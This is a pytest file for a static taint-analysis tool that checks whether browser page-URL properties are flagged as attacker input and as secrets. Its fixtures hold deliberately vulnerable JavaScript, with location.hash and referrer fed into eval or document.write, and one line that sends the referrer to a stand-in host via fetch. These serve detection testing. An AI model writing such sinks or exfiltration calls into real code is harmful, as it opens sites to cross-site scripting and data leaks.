# SPDX-License-Identifier: AGPL-3.0-or-later
"""The page URL is attacker input as well as a possible secret (INV-dadu).

Whoever sends a user to a page chooses its URL, its referrer and
``window.name``: a link can put anything in them. That makes a flow out of
them the untrusted-input shape (attacker data reaching a sink). The URL can
ALSO carry a credential (an OAuth ``#access_token`` fragment, a reset token),
which is why it is ``env_read`` and a ``host_secret`` source; both readings
are true at once, so the URL spellings are declared under ``env_read`` AND
``navigation_read`` with ``simultaneous: true``.

Measured on the shipped CLI before this change, one JS file reading
``document.location.hash`` into ``eval`` (or ``document.write``):

    host_secret     -> code_execution / dom_injection   violated
    untrusted_input -> code_execution / dom_injection   inconclusive, no flow

so the canonical DOM-XSS claim could never find a flow that starts at the
page URL. It read ``inconclusive`` only because the sink call tripped the
unclassified-module gate (INV-dudal); with that gate fixed it would have read
``confirmed``.
"""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path

import pytest

from hypergumbo_core.cli import main


def _run(argv: list[str], cache: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    monkeypatch.setenv("XDG_CACHE_HOME", str(cache))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(argv)
    return buf.getvalue()


def _repo(tmp_path: Path, body: str, name: str = "a.js") -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    # Source and sink on separate lines (INV-muhij ordering).
    (repo / name).write_text(
        f"function run() {{\n{body}\n}}\nmodule.exports = {{ run }};\n"
    )
    return repo


def _chains(tmp_path: Path, repo: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, set[str]]:
    out = _run(["io-boundaries", str(repo), "--format", "json"], tmp_path / "cache", monkeypatch)
    return {
        b: {c["primitive"] for c in v["chains"]}
        for b, v in json.loads(out)["boundaries"].items()
    }


def _verdict(tmp_path: Path, repo: Path, monkeypatch: pytest.MonkeyPatch,
             label: str, zone: str) -> dict:
    claims = tmp_path / f"claims_{label}_{zone}.yaml"
    claims.write_text(
        "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
        f"        source_taint: {label}\n        prohibited_sink_zone: {zone}\n"
    )
    out = _run(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"],
               tmp_path / "cache", monkeypatch)
    (verdict,) = json.loads(out)["verdicts"]
    return verdict


_URL_SPELLINGS = [
    "document.location", "window.location", "document.referrer",
    "document.URL", "document.documentURI", "document.baseURI",
]


@pytest.mark.parametrize("spelling", _URL_SPELLINGS)
def test_every_url_spelling_is_both_boundaries(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spelling: str,
) -> None:
    repo = _repo(tmp_path, f"  const u = {spelling};\n  return u;")
    chains = _chains(tmp_path, repo, monkeypatch)
    assert spelling in chains.get("env_read", set()), chains
    assert spelling in chains.get("navigation_read", set()), chains


def test_window_name_is_attacker_input_only(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The opener sets window.name; nothing makes it a credential store."""
    repo = _repo(tmp_path, "  const n = window.name;\n  return n;")
    chains = _chains(tmp_path, repo, monkeypatch)
    assert "window.name" in chains.get("navigation_read", set()), chains
    assert "window.name" not in chains.get("env_read", set()), chains


def test_the_cookie_and_the_host_description_are_not_navigation_input(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """THE CONTROL: the document row's other member and the window globals
    that describe the host keep exactly the boundary they had."""
    repo = _repo(tmp_path, "  const c = document.cookie;\n"
                           "  const a = window.navigator.userAgent;\n  return c + a;")
    chains = _chains(tmp_path, repo, monkeypatch)
    navigation = chains.get("navigation_read", set())
    assert "document.cookie" in chains.get("env_read", set()), chains
    assert "document.cookie" not in navigation, chains
    assert "window.navigator" in chains.get("host_info_read", set()), chains
    assert "window.navigator" not in navigation, chains


@pytest.mark.parametrize("sink, zone", [
    ("eval(s);", "code_execution"),
    ("document.write(s);", "dom_injection"),
])
def test_the_page_url_reaching_an_injection_sink_is_attacker_input(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sink: str, zone: str,
) -> None:
    repo = _repo(tmp_path, f"  const s = document.location.hash;\n  {sink}")
    verdict = _verdict(tmp_path, repo, monkeypatch, "untrusted_input", zone)
    assert verdict["verdict"] == "violated", verdict["details"]
    assert any("document.location" in e["source_primitives"] for e in verdict["evidence"])


def test_the_secret_reading_is_kept(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Adding the attacker reading must not drop the credential one: a
    referrer sent to the network is still a host_secret flow."""
    repo = _repo(tmp_path, "  const r = document.referrer;\n"
                           '  fetch("https://x.example/log?r=" + r);')
    verdict = _verdict(tmp_path, repo, monkeypatch, "host_secret", "network")
    assert verdict["verdict"] == "violated", verdict["details"]
    assert any("document.referrer" in e["source_primitives"] for e in verdict["evidence"])


def test_typescript_inherits_it(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = _repo(tmp_path, "  const s: string = document.referrer;\n  eval(s);", name="a.ts")
    verdict = _verdict(tmp_path, repo, monkeypatch, "untrusted_input", "code_execution")
    assert verdict["verdict"] == "violated", verdict["details"]
